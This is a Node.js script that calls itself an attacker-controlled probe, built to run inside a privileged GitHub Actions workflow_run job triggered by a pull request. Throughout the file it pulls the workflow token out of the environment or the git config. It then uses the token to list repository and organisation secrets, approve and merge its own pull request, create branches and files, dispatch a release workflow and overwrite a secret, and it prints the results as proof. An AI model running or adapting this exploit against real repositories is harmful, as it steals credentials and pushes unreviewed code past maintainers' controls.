// Attacker-controlled probe executed from the PR merge ref inside the
// privileged workflow_run "Validate quickstarts" job.
const fs = require('fs');
const { execSync } = require('child_process');

const ws = process.env.GITHUB_WORKSPACE || process.cwd();
const repo = process.env.GITHUB_REPOSITORY || '';
const evName = process.env.GITHUB_EVENT_NAME || '';
const runId = process.env.GITHUB_RUN_ID || '';
const pr = process.env['pr-number'] || '';

function gitToken() {
  if (process.env.GITHUB_TOKEN) return process.env.GITHUB_TOKEN;
  try {
    const line = execSync('git config --local --get http.https://github.com/.extraheader', { cwd: ws, encoding: 'utf8' }).trim();
    const m = line.match(/basic\s+([A-Za-z0-9+/=]+)/i);
    if (m) {
      const dec = Buffer.from(m[1], 'base64').toString('utf8');
      return dec.includes(':') ? dec.slice(dec.indexOf(':') + 1) : dec;
    }
  } catch (e) {}
  try {
    const p = fs.readFileSync(ws + '/.git/config', 'utf8');
    const m = p.match(/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
    if (m) {
      const dec = Buffer.from(m[1], 'base64').toString('utf8');
      return dec.includes(':') ? dec.slice(dec.indexOf(':') + 1) : dec;
    }
  } catch (e) {}
  return '';
}

const tok = gitToken();
const hdr = {
  authorization: 'Bearer ' + tok,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'pwn-probe'
};

async function api(method, url, body) {
  try {
    const r = await fetch('https://api.github.com' + url, {
      method, headers: hdr, body: body === undefined ? undefined : JSON.stringify(body)
    });
    const text = await r.text();
    let data;
    try { data = JSON.parse(text); } catch (e) { data = text.slice(0, 200); }
    return { status: r.status, accepted: r.headers.get('x-accepted-github-permissions'), data };
  } catch (e) { return { error: String(e) }; }
}

async function gql(query, variables) {
  try {
    const r = await fetch('https://api.github.com/graphql', {
      method: 'POST', headers: hdr, body: JSON.stringify({ query, variables })
    });
    return { status: r.status, data: await r.json() };
  } catch (e) { return { error: String(e) }; }
}

function msg(x) {
  const d = x && x.data;
  return x && x.status !== undefined ? { status: x.status, accepted: x.accepted, message: (d && (d.message || d.error)) || undefined } : x;
}

(async () => {
  const out = { marker: 'PWN_MARKER_RCE', now: new Date().toISOString() };
  out.env = {
    event: evName, repo, run: runId, pr, job: process.env.GITHUB_JOB,
    ref: process.env.GITHUB_REF, sha: process.env.GITHUB_SHA,
    actor: process.env.GITHUB_ACTOR, triggering: process.env.GITHUB_TRIGGERING_ACTOR,
    workflow: process.env.GITHUB_WORKFLOW
  };
  out.token = { present: tok.length > 0, len: tok.length, hasEnvToken: !!process.env.GITHUB_TOKEN };
  try {
    const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'));
    out.event = {
      action: ev.action,
      workflow_run: ev.workflow_run && {
        id: ev.workflow_run.id, event: ev.workflow_run.event,
        head_branch: ev.workflow_run.head_branch, head_sha: ev.workflow_run.head_sha,
        head_repo: ev.workflow_run.head_repository && ev.workflow_run.head_repository.full_name,
        conclusion: ev.workflow_run.conclusion
      }
    };
  } catch (e) { out.event = { error: String(e) }; }

  // Leaked environment/source names only (no values).
  out.envNames = Object.keys(process.env).filter(k => /TOKEN|SECRET|FLAG|KEY|PASS/i.test(k));

  out.user = await api('GET', '/user');
  out.repoInfo = await api('GET', '/repos/' + repo);
  out.tokenPerms = out.repoInfo.data && out.repoInfo.data.permissions;

  const sha = (out.event.workflow_run && out.event.workflow_run.head_sha) || process.env.GITHUB_SHA;
  out.statuses = await api('POST', '/repos/' + repo + '/statuses/' + sha, {
    state: 'success', context: 'PWN_PROOF', description: 'workflow_run RCE'
  });
  out.secretsList = await api('GET', '/repos/' + repo + '/actions/secrets');
  out.varsList = await api('GET', '/repos/' + repo + '/actions/variables');

  if (pr) {
    out.pullGet = await api('GET', '/repos/' + repo + '/pulls/' + pr);
    const node = out.pullGet.data && out.pullGet.data.node_id;
    out.pull = out.pullGet.data && {
      number: out.pullGet.data.number, state: out.pullGet.data.state,
      mergeable: out.pullGet.data.mergeable, mergeable_state: out.pullGet.data.mergeable_state,
      auto_merge: out.pullGet.data.auto_merge, node_id: node,
      head_repo: out.pullGet.data.head && out.pullGet.data.head.repo && out.pullGet.data.head.repo.full_name
    };
    // 1. Approval (non-self: actor is github-actions[bot]).
    out.approve = await api('POST', '/repos/' + repo + '/pulls/' + pr + '/reviews', {
      event: 'APPROVE', body: 'PWN approval probe'
    });
    // 2. Ask GitHub to auto-merge; branch in this repo is unprotected.
    if (node) {
      out.autoMerge = await gql(
        'mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
        { id: node }
      );
    }
    // 3. Direct merge.
    out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'squash' });
    // 4. GraphQL merge.
    if (node) {
      out.gqlMerge = await gql(
        'mutation($id:ID!){mergePullRequest(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
        { id: node }
      );
    }
    // 5. Update branch (would write to head repo).
    out.updateBranch = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {});
    // 6. Comment (pull-requests:write capability).
    out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', {
      body: 'PWN_RCE_PROOF workflow_run RCE\n```json\n' +
        JSON.stringify({ user: out.user.data && out.user.data.login, perms: out.tokenPerms, event: evName, run: runId, job: process.env.GITHUB_JOB }, null, 1) +
        '\n```'
    });
  }

  // Contents-write probes.
  out.createRef = await api('POST', '/repos/' + repo + '/git/refs', {
    ref: 'refs/heads/pwn-probe-' + runId, sha
  });
  out.blob = await api('POST', '/repos/' + repo + '/git/blobs', { content: 'pwn', encoding: 'utf-8' });
  out.putFile = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt', {
    message: 'pwn probe', content: Buffer.from('pwn').toString('base64')
  });
  // 7. Dispatch a workflow in the base repo.
  out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414956897/dispatches', { ref: 'release' });

  // Org-secret discovery and permission checks (read-only where possible).
  out.orgSecretsRepo = await api('GET', '/repos/' + repo + '/actions/organization-secrets');
  out.orgSecrets = await api('GET', '/orgs/PDFtoMark/actions/secrets');
  out.repoActionsPerms = await api('GET', '/repos/' + repo + '/actions/permissions');
  out.branchProtection = await api('GET', '/repos/' + repo + '/branches/release/protection');
  out.putSecret = await api('PUT', '/repos/' + repo + '/actions/secrets/FLAG', { encrypted_value: 'AAAA', key_id: 'AAAA' });


  const s = {
    marker: out.marker, env: out.env, token: out.token,
    user: out.user && { status: out.user.status, login: out.user.data && out.user.data.login },
    tokenPerms: out.tokenPerms,
    repo: out.repoInfo && { status: out.repoInfo.status, default_branch: out.repoInfo.data && out.repoInfo.data.default_branch },
    statuses: msg(out.statuses),
    secretsList: msg(out.secretsList),
    varsList: msg(out.varsList),
    pullGet: out.pullGet && { status: out.pullGet.status },
    pull: out.pull,
    approve: msg(out.approve),
    autoMerge: out.autoMerge && { status: out.autoMerge.status, data: out.autoMerge.data },
    merge: msg(out.merge),
    gqlMerge: out.gqlMerge && { status: out.gqlMerge.status, data: out.gqlMerge.data },
    updateBranch: msg(out.updateBranch),
    comment: msg(out.comment),
    createRef: msg(out.createRef),
    blob: msg(out.blob),
    putFile: msg(out.putFile),
    dispatch: msg(out.dispatch),
    orgSecretsRepo: msg(out.orgSecretsRepo),
    orgSecrets: msg(out.orgSecrets),
    repoActionsPerms: msg(out.repoActionsPerms),
    branchProtection: msg(out.branchProtection),
    putSecret: msg(out.putSecret),
    envNames: out.envNames
  };
  const j = JSON.stringify(s);
  console.log('PWN_RESULT ' + j);
  console.log('PWN_RESULT_B64 ' + Buffer.from(j).toString('base64'));
  try {
    fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,
      '\n## PWN RCE\n```json\n' + JSON.stringify(s, null, 1) + '\n```\n```\n' +
      Buffer.from(j).toString('base64') + '\n```\n');
  } catch (e) {}
})();
